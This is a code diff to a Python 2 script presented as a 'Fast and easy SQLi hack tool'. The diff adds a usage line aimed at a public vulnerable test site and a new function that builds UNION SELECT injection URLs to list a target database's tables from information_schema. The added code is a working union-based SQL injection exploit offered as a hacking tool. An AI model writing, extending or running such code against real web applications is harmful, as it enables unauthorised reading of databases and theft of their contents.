@@ -11,12 +11,13 @@ ____ _              ___      _                     _____
                          |___/                                                 
 
 More: https://www.facebook.com/TheCybersTeam
-Fast and easy SQLi hack tool Beta 0.7
+Usage: python sqli.py --url http://testphp.vulnweb.com/listproducts.php?cat=1
+Fast and easy SQLi hack tool Beta 0.8
 """
 print header
 
 for k, v in enumerate(sys.argv):
-    if v == "-url":
+    if v == "--url":
         try:
             u = sys.argv[k+1]
             pos = u.find("=")
@@ -102,4 +103,20 @@ def getDatabase(vulCol,columns,url):
 database = getDatabase(vulCol,columns,url)
 print "Database: "+database
 
+def getTables(database,vulCol,columns, url):
+    url = url + "-1 union select "
+    for i in range(1, columns+1):
+        if i != 1 and i != columns+1:
+            url = url + ", "
+        if i == vulCol:
+            url = url + "concat(0x27,0x23,group_concat(unhex(hex(table_name))),0x23,0x27)"
+        else:
+            url = url + str(i)
+
+    url = url + " from+information_schema.tables where table_schema='"+database+"'"
+    res = getContent(url)
+    return getVars(res)
+
+tables = getTables(database,vulCol,columns, url)
+print "Tables: "+tables
 
